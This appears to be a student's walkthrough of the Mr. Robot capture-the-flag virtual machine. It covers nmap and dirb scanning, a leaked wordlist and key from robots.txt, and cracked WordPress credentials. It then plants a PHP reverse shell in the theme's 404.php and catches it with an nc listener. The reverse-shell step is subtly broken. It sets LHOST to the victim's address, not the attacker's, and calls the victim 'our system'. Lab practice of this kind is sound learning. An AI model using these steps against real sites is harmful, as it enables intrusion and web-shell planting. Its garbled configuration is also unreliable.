1) Find the victim's IP address
Attacker IP: 10.0.2.15
Victim IP: 10.0.2.7

2) Port Scanning
Command
#nmap -sV -sU 10.0.2.7
#nmap -T4 -A 10.0.2.7

Open Ports
80	http
443 https

3) Spidering(Directory BruteForce)
	It can also be performed in Burpsuite(Crawl and Audit)
	Command: dirb http://10.0.2.7/
	Command: dirb https://10.0.2.7/

	We do not know the login credentials
	

http://10.0.2.7/robots.txt

User agent: *
fsocity.dic
key-1-of-3.txt

http://10.0.2.7/fsocity.dic

Opening this webpage automatically downloaded a file fsocity.dic
Command: wc -l fsocity.dic		//Command for word count
The file contains 858160 words
Sorting and writing the unique words onto another file

The objective of the Mr. Robot Virtual Machine is to find 3 keys. The first of 3 keys is found.
Key_1: 073403c8a58a1f80d943455fb30724b9

Perform password cracking using fuzzing technique to find the username and password for wordpress webpage	
username: elliot
password: ER28-0652
Login using these credentials

Copy the file present by default in Kali Linux
cp /usr/share/webshells/php/php-reverse-shell.php .		//php-reverse-shell.php is a malware template
This file contains code to give shell access to the victim. It is a read-only file.
Edit the file and click on Save-as because it can't be saved since it is read-only
From: LHOST="127.0.0.1"
To: LHOST="10.0.2.7"		//IP address of the device to be given access to

Create a listener
Command: #nc -nlvp 1234				//Starting listener
Here, 1234 is the port number, it is also displayed in the php-reverse-shell.php file

Dashboard of the Wordpress is opened
Open the Dashboard -> Appearance -> Editor
GoTo Templates -> 404.php
Edit the 404.php file
Replace the contents with the contents of changed php-reverse-shell.php file.
Update File

http://10.0.2.7/fwaserf		//Some directory that does not exist
When a directory that does not exist is requested, a 404-Not Found error is to be displayed.
But we changed the contents of the 404.php file into our malware.
The changed php-reverse-shell.php malware will be executed
This gives the shell access to our system(10.0.2.7).
